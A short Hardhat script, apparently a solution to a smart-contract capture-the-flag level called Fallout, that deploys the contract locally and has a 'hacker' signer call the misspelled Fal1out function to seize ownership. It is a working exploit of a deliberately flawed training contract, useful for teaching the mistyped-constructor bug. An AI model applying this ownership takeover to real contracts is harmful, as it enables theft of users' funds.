const hre = require("hardhat");

async function main() {
  const Fallout = await hre.ethers.getContractFactory("Fallout");
  const fallout = await Fallout.deploy();
  await fallout.deployed();

  const [ownerDeployer, hacker] = await hre.ethers.getSigners();

  await fallout.connect(hacker).Fal1out();
  console.log(hacker.address == await fallout.owner());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
